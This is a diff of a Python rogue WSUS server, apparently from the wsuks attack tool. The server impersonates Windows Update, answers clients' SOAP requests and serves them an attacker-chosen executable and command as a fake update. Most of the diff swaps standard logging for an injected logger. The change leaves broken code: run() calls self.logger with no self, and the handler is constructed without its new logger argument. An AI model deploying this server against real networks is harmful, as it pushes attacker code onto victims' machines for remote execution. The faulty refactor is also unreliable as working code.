@@ -8,14 +8,16 @@ import html
 import datetime
 import base64
 import hashlib
-import logging
 import sys
 import os
 import argparse
+import wsuks
 
 
 class WSUSUpdateHandler:
-    def __init__(self, executable_file, executable_name, client_address):
+    def __init__(self, executable_file, executable_name, client_address, logger):
+        self.logger = logger
+
         self.get_config_xml = ''
         self.get_cookie_xml = ''
         self.register_computer_xml = ''
@@ -47,44 +49,44 @@ class WSUSUpdateHandler:
     def set_resources_xml(self, command):
         # init resources
 
-        path = os.path.abspath(os.path.dirname(__file__))
+        path = os.path.abspath(os.path.dirname(wsuks.__file__))
 
         try:
-            with open('{}/resources/get-config.xml'.format(path), 'r') as file:
+            with open('{}/xml_files/get-config.xml'.format(path), 'r') as file:
                 self.get_config_xml = file.read().format(lastChange=self.get_last_change())
                 file.close()
 
-            with open('{}/resources/get-cookie.xml'.format(path), 'r') as file:
+            with open('{}/xml_files/get-cookie.xml'.format(path), 'r') as file:
                 self.get_cookie_xml = file.read().format(expire=self.get_expire(), cookie=self.get_cookie())
                 file.close()
 
-            with open('{}/resources/register-computer.xml'.format(path), 'r') as file:
+            with open('{}/xml_files/register-computer.xml'.format(path), 'r') as file:
                 self.register_computer_xml = file.read()
                 file.close()
 
-            with open('{}/resources/sync-updates.xml'.format(path), 'r') as file:
+            with open('{}/xml_files/sync-updates.xml'.format(path), 'r') as file:
                 # TODO KB1234567 -> dynamic
                 self.sync_updates_xml = file.read().format(revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1],
                                                            deployment_id1=self.deployment_ids[0], deployment_id2=self.deployment_ids[1],
                                                            uuid1=self.uuids[0], uuid2=self.uuids[1], expire=self.get_expire(), cookie=self.get_cookie())
                 file.close()
 
-            with open('{}/resources/get-extended-update-info.xml'.format(path), 'r') as file:
+            with open('{}/xml_files/get-extended-update-info.xml'.format(path), 'r') as file:
                 self.get_extended_update_info_xml = file.read().format(revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1], sha1=self.sha1, sha256=self.sha256,
                                                                        filename=self.executable_name, file_size=len(executable_file), command=html.escape(html.escape(command)),
                                                                        url='http://{host}/{path}/{executable}'.format(host=self.client_address, path=uuid.uuid4(), executable=self.executable_name))
                 file.close()
 
-            with open('{}/resources/report-event-batch.xml'.format(path), 'r') as file:
+            with open('{}/xml_files/report-event-batch.xml'.format(path), 'r') as file:
                 self.report_event_batch_xml = file.read()
                 file.close()
 
-            with open('{}/resources/get-authorization-cookie.xml'.format(path), 'r') as file:
+            with open('{}/xml_files/get-authorization-cookie.xml'.format(path), 'r') as file:
                 self.get_authorization_cookie_xml = file.read().format(cookie=self.get_cookie())
                 file.close()
 
         except Exception as err:
-            logging.error('Error: {err}'.format(err=err))
+            self.logger.error('Error: {err}'.format(err=err))
             sys.exit(1)
 
     def set_filedigest(self):
@@ -98,7 +100,7 @@ class WSUSUpdateHandler:
             self.sha256 = base64.b64encode(hash256.digest()).decode()
 
         except Exception as err:
-            logging.error('Error in set_filedigest: {err}'.format(err=err))
+            self.logger.error('Error in set_filedigest: {err}'.format(err=err))
             sys.exit(1)
 
     def __str__(self):
@@ -107,6 +109,10 @@ class WSUSUpdateHandler:
 
 
 class WSUSBaseServer(BaseHTTPRequestHandler):
+    def __init__(self, logger):
+        self.logger = logger
+        super().__init__()
+
     def _set_response(self, serveEXE=False):
 
         self.protocol_version = 'HTTP/1.1'
@@ -126,18 +132,18 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
         self.end_headers()
 
     def do_HEAD(self):
-        logging.debug('HEAD request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))
+        self.logger.debug('HEAD request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))
 
         if self.path.find(".exe"):
-            logging.info("Requested: {path}".format(path=self.path))
+            self.logger.info("Requested: {path}".format(path=self.path))
 
             self._set_response(True)
 
     def do_GET(self):
-        logging.debug('GET request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))
+        self.logger.debug('GET request,\nPath: {path}\nHeaders:\n{headers}\n'.format(path=self.path, headers=self.headers))
 
         if self.path.find(".exe"):
-            logging.info("Requested: {path}".format(path=self.path))
+            self.logger.info("Requested: {path}".format(path=self.path))
 
             self._set_response(True)
             self.wfile.write(update_handler.executable)
@@ -150,7 +156,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
         post_data_xml = BeautifulSoup(post_data, "xml")
         data = None
 
-        logging.debug("POST Request,\nPath: {path}\nHeaders:\n{headers}\n\nBody:\n{body}\n".format(path=self.path, headers=self.headers, body=post_data_xml.encode_contents()))
+        self.logger.debug("POST Request,\nPath: {path}\nHeaders:\n{headers}\n\nBody:\n{body}\n".format(path=self.path, headers=self.headers, body=post_data_xml.encode_contents()))
 
         soap_action = self.headers['SOAPAction']
 
@@ -179,7 +185,7 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
             data = BeautifulSoup(update_handler.report_event_batch_xml, "xml")
 
             post_data_report = BeautifulSoup(post_data, "xml")
-            logging.info('Client Report: {targetID}, {computerBrand}, {computerModel}, {extendedData}.'.format(targetID=post_data_report.TargetID.text,
+            self.logger.info('Client Report: {targetID}, {computerBrand}, {computerModel}, {extendedData}.'.format(targetID=post_data_report.TargetID.text,
                                                                                                 computerBrand=post_data_report.ComputerBrand.text,
                                                                                                 computerModel=post_data_report.ComputerModel.text,
                                                                                                 extendedData=post_data_report.ExtendedData.ReplacementStrings.string)) 
@@ -189,26 +195,26 @@ class WSUSBaseServer(BaseHTTPRequestHandler):
             data = BeautifulSoup(update_handler.get_authorization_cookie_xml, "xml")
 
         else:
-            logging.warning("SOAP Action not handled")
-            logging.info('SOAP Action: {}'.format(soap_action))
+            self.logger.warning("SOAP Action not handled")
+            self.logger.info('SOAP Action: {}'.format(soap_action))
             return
 
         self._set_response()
         self.wfile.write(data.encode_contents())
 
-        logging.info('SOAP Action: {}'.format(soap_action))
+        self.logger.info('SOAP Action: {}'.format(soap_action))
 
         if data is not None:
-            logging.debug("POST Response,\nPath: {path}\nHeaders:\n{headers}\n\nBody:\n{body}\n".format(path=self.path, headers=self.headers, body=data.encode_contents))
+            self.logger.debug("POST Response,\nPath: {path}\nHeaders:\n{headers}\n\nBody:\n{body}\n".format(path=self.path, headers=self.headers, body=data.encode_contents))
         else:
-            logging.warning("POST Response without data.")
+            self.logger.warning("POST Response without data.")
 
 
 def run(host, port, server_class=HTTPServer, handler_class=WSUSBaseServer):
     server_address = (host, port)
     httpd = server_class(server_address, handler_class)
 
-    logging.info('Starting httpd...\n')
+    self.logger.info('Starting httpd...\n')
 
     try:
         httpd.serve_forever()
@@ -216,7 +222,7 @@ def run(host, port, server_class=HTTPServer, handler_class=WSUSBaseServer):
         pass
 
     httpd.server_close()
-    logging.info('Stopping httpd...\n')
+    self.logger.info('Stopping httpd...\n')
 
 
 def parse_args():
@@ -236,20 +242,15 @@ def parse_args():
 if __name__ == '__main__':
     args = parse_args()
 
-    if args.verbose:
-        logging.basicConfig(level=logging.DEBUG)
-    else:
-        logging.basicConfig(level=logging.INFO)
-
     executable_file = args.executable.read()
     executable_name = os.path.basename(args.executable.name)
     args.executable.close()
 
-    update_handler = WSUSUpdateHandler(executable_file, executable_name, client_address='{host}:{port}'.format(host=args.host, port=args.port))
+    update_handler = WSUSUpdateHandler(executable_file, executable_name, client_address=f'{args.host}:{args.port}')
 
     update_handler.set_filedigest()
     update_handler.set_resources_xml(args.command)
 
-    logging.info(update_handler)
+    # self.logger.info(update_handler)
 
     run(host=args.host, port=args.port)
